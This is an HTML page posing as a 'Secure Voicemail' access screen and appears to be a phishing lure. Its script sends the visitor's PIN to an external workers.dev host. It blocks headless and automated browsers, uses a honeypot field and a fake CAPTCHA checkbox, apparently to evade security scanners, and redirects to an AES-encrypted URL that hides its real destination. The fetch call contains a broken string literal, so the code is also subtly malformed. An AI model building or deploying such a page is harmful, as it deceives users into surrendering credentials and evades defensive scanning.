<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Secure Voicemail</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 500px;
    }
    .code-input {
      width: 100%;
      padding: 0.7rem;
      margin-top: 1rem;
      font-size: 1rem;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    .play {
      margin-top: 1rem;
      padding: 0.7rem 1.2rem;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
    }
    .play:disabled {
      background-color: gray;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Voicemail Access</h2>
    <form id="access-form">
      <input type="password" name="pin" class="code-input" placeholder="Enter PIN" required />
      <!-- Honeypot -->
      <input type="text" name="extra_field" style="display:none" />
      <label style="display: block; margin-top: 1rem;">
        <input type="checkbox" id="captcha"> I'm not a robot
      </label>
      <button type="submit" class="play">▶️ Play</button>
    </form>
  </div>

  <script>
    const form = document.getElementById('access-form');

    function isHeadless() {
      return (
        navigator.webdriver ||
        !navigator.plugins.length ||
        /HeadlessChrome/.test(navigator.userAgent)
      );
    }

    function decryptAES(encrypted, keyHex, ivHex) {
      const key = CryptoJS.enc.Hex.parse(keyHex);
      const iv = CryptoJS.enc.Hex.parse(ivHex);
      const decrypted = CryptoJS.AES.decrypt(encrypted, key, {
        iv: iv,
        mode: CryptoJS.mode.CBC,
        padding: CryptoJS.pad.Pkcs7
      });
      return decrypted.toString(CryptoJS.enc.Utf8);
    }

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const formData = new FormData(form);
      const pin = formData.get("pin");
      const honeypot = formData.get("extra_field");
      const captcha = document.getElementById("captcha").checked;

      if (honeypot) {
        alert("Bot activity detected.");
        return;
      }

      if (!captcha) {
        alert("Please complete CAPTCHA.");
        return;
      }

      if (isHeadless()) {
        alert("Headless browsers are not allowed.");
        return;
      }

      try {
        const res = await fetch("https://voicemail-worker.allanfree707.workers.dev/ {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ pin, captcha: true })
        });

        const data = await res.json();
        if (data.success) {
          const decrypted = decryptAES(data.encrypted, data.key, data.iv);
          window.location.href = decrypted;
        } else {
          alert(data.error || "Unknown error");
        }
      } catch (err) {
        console.error(err);
        alert("Server error.");
      }
    });
  </script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
</body>
</html>
